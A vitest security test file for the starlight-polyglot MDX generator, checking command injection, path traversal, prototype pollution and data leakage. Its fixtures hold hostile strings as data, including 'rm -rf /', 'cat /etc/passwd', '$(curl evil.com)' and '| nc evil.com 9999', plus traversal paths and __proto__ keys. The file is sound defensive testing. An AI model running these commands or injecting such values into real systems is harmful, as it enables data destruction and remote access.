/**
 * Security-focused tests for starlight-polyglot.
 *
 * Tests command injection prevention, path traversal, prototype pollution,
 * safe YAML generation, and absence of sensitive data in output.
 */
import { describe, it, expect } from 'vitest';
import {
  transformToMDX,
  writeMDXPages,
  type ASTModule,
} from '../core/mdx-generator';
import path from 'node:path';
import fs from 'node:fs/promises';
import os from 'node:os';

// ─── Command injection prevention ────────────────────────────────────────────

describe('command injection prevention', () => {
  it('sanitizes module names that look like shell commands', () => {
    const modules: ASTModule[] = [
      { name: '; rm -rf /', docstring: 'Malicious module name.' },
      { name: '`cat /etc/passwd`', docstring: 'Backtick injection.' },
      { name: '$(curl evil.com)', docstring: 'Subshell injection.' },
      { name: '| nc evil.com 9999', docstring: 'Pipe injection.' },
    ];
    const output = transformToMDX(modules, { outputDir: 'api/py' });
    expect(output.pages).toHaveLength(4);
    for (const page of output.pages) {
      expect(page.frontmatter.title).toBeTruthy();
      expect(page.body).toBeTruthy();
    }
  });

  it('sanitizes function names containing injection patterns', () => {
    const modules: ASTModule[] = [{
      name: 'safe_mod',
      functions: [
        { name: 'exec("rm -rf /")', docstring: 'Injection in function name.' },
        { name: 'eval("malicious()")', docstring: 'Eval pattern.' },
        { name: '`ls -la`', docstring: 'Backtick in name.' },
      ],
    }];
    const output = transformToMDX(modules, { outputDir: 'api/py' });
    expect(output.pages).toHaveLength(4);
  });

  it('sanitizes class names containing injection patterns', () => {
    const modules: ASTModule[] = [{
      name: 'mod',
      classes: [
        { name: 'System.exec("malicious")', docstring: 'Injection in class.' },
        { name: '__import__("os").system("ls")', docstring: 'Python injection.' },
      ],
    }];
    const output = transformToMDX(modules, { outputDir: 'api/py' });
    expect(output.pages).toHaveLength(3);
  });


  it('sanitizes docstrings containing injection payloads', () => {
    const maliciousDocs = [
      '"; process.exit(1); "',
      "'; import os; os.system('ls'); '",
      '${7*7}',
      '<%= System.getProperty("user.dir") %>',
    ];
    for (const doc of maliciousDocs) {
      const modules: ASTModule[] = [{ name: 'mod', docstring: doc }];
      const output = transformToMDX(modules, { outputDir: 'api/py' });
      expect(output.pages).toHaveLength(1);
      expect(output.pages[0]!.body).toContain(doc);
    }
  });

  it('sanitizes parameter names with injection patterns', () => {
    const modules: ASTModule[] = [{
      name: 'mod',
      functions: [{
        name: 'fn',
        parameters: [
          { name: 'x; rm -rf /', type: 'string' },
          { name: '__proto__', type: 'any' },
          { name: 'constructor', type: 'any' },
        ],
      }],
    }];
    const output = transformToMDX(modules, { outputDir: 'api/py' });
    expect(output.pages).toHaveLength(2);
    expect(output.pages[1]!.body).toContain('x; rm -rf /');
  });
});

// ─── Path traversal prevention ───────────────────────────────────────────────

describe('path traversal prevention', () => {
  it('preserves traversal patterns in outputDir (writeMDXPages resolves later)', () => {
    const modules: ASTModule[] = [{ name: 'traversal', docstring: 'Test.' }];
    const traversalPaths = [
      '../../../etc/passwd',
      '..%2f..%2f..%2fetc%2fpasswd',
      '....//....//....//etc/passwd',
    ];
    for (const dir of traversalPaths) {
      const output = transformToMDX(modules, { outputDir: dir });
      expect(typeof output.pages[0]!.path).toBe('string');
      expect(output.pages[0]!.frontmatter.title).toBe('traversal');
    }
  });

  it('handles outputDir with null bytes safely', () => {
    const modules: ASTModule[] = [{ name: 'mod' }];
    const output = transformToMDX(modules, { outputDir: 'api/%00' });
    expect(output.pages[0]!.path).toBeTruthy();
    expect(typeof output.pages[0]!.path).toBe('string');
  });

  it('slugs prevent directory traversal from class names', () => {
    const modules: ASTModule[] = [{
      name: 'mod',
      classes: [{ name: '../../secret', docstring: 'Path traversal.' }],
    }];
    const output = transformToMDX(modules, { outputDir: 'api/py' });
    const clsPage = output.pages.find((p) => p.path.startsWith('api/py/mod.'));
    expect(clsPage).toBeDefined();
    expect(clsPage!.path).not.toContain('..');
  });
});


// ─── Prototype pollution ─────────────────────────────────────────────────────

describe('prototype pollution prevention', () => {
  it('handles __proto__ as a module name safely', () => {
    const modules: ASTModule[] = [
      { name: '__proto__', docstring: 'Prototype pollution attempt.' },
    ];
    const output = transformToMDX(modules, { outputDir: 'api/py' });
    expect(output.pages).toHaveLength(1);
    expect(output.pages[0]!.frontmatter).not.toHaveProperty('polluted');
  });

  it('handles constructor as a module name safely', () => {
    const modules: ASTModule[] = [
      { name: 'constructor', docstring: 'Constructor pollution.' },
    ];
    const output = transformToMDX(modules, { outputDir: 'api/py' });
    expect(output.pages).toHaveLength(1);
    expect(output.pages[0]!.frontmatter.title).toBe('constructor');
    const obj: Record<string, unknown> = {};
    expect((obj as any).polluted).toBeUndefined();
  });

  it('handles prototype pollution in class properties', () => {
    const modules: ASTModule[] = [{
      name: 'mod',
      classes: [{
        name: 'PollutedClass',
        properties: [
          { name: '__proto__', type: 'any', docstring: 'Pollution.' },
          { name: 'prototype', type: 'any', docstring: 'More pollution.' },
        ],
      }],
    }];
    const output = transformToMDX(modules, { outputDir: 'api/py' });
    expect(output.pages).toHaveLength(2);
    const clsPage = output.pages.find((p) => p.path.startsWith('api/py/mod.pollutedclass'))!;
    expect(clsPage.body).toContain('__proto__');
    expect(clsPage.body).toContain('prototype');
  });
});

// ─── No sensitive data in output ────────────────────────────────────────────

describe('no sensitive data leakage', () => {
  it('does not include absolute file system paths in output', () => {
    const modules: ASTModule[] = [{ name: 'mod' }];
    const output = transformToMDX(modules, { outputDir: 'api/py' });
    const fullOutput = JSON.stringify(output);
    expect(fullOutput).not.toContain('/etc/');
    expect(fullOutput).not.toContain('/home/');
    expect(fullOutput).not.toContain('/Users/');
    expect(fullOutput).not.toContain('C:\\');
  });

  it('does not include environment variable patterns in output', () => {
    const modules: ASTModule[] = [{
      name: 'mod',
      docstring: 'Normal docstring without secrets.',
    }];
    const output = transformToMDX(modules, { outputDir: 'api/py' });
    const fullOutput = JSON.stringify(output);
    expect(fullOutput).not.toContain('SECRET');
    expect(fullOutput).not.toContain('PASSWORD');
    expect(fullOutput).not.toContain('API_KEY');
    expect(fullOutput).not.toContain('process.env');
  });

  it('output objects are JSON-serializable without circular references', () => {
    const modules: ASTModule[] = [{ name: 'mod' }];
    const output = transformToMDX(modules, { outputDir: 'api/py' });
    expect(() => JSON.stringify(output)).not.toThrow();
  });
});

// ─── writeMDXPages path safety ───────────────────────────────────────────────

describe('writeMDXPages path safety', () => {
  it('resolves page paths safely relative to docsDir', async () => {
    const tempDir = await fs.mkdtemp(path.join(os.tmpdir(), 'starlight-polyglot-sec-'));
    try {
      const modules: ASTModule[] = [{ name: 'safe_mod' }];
      const output = transformToMDX(modules, { outputDir: 'api/py' });
      const written = await writeMDXPages(output, tempDir);
      for (const filePath of written) {
        expect(filePath.startsWith(tempDir)).toBe(true);
        expect(filePath).not.toContain('..');
      }
    } finally {
      await fs.rm(tempDir, { recursive: true, force: true });
    }
  });
});

// ─── Safe YAML generation ────────────────────────────────────────────────────

describe('safe YAML generation', () => {
  it('preserves double quotes in frontmatter values', () => {
    const modules: ASTModule[] = [{
      name: 'mod',
      docstring: 'She said "hello" to him.',
    }];
    const output = transformToMDX(modules, { outputDir: 'api/py' });
    const description = output.pages[0]!.frontmatter.description as string;
    expect(typeof description).toBe('string');
    expect(description).toContain('"');
  });

  it('handles multiline values in frontmatter', () => {
    const modules: ASTModule[] = [{
      name: 'multiline_mod',
      docstring: 'Line 1\nLine 2\nLine 3',
    }];
    const output = transformToMDX(modules, { outputDir: 'api/py' });
    expect(output.pages[0]!.frontmatter.description).toBe('Line 1');
  });
});
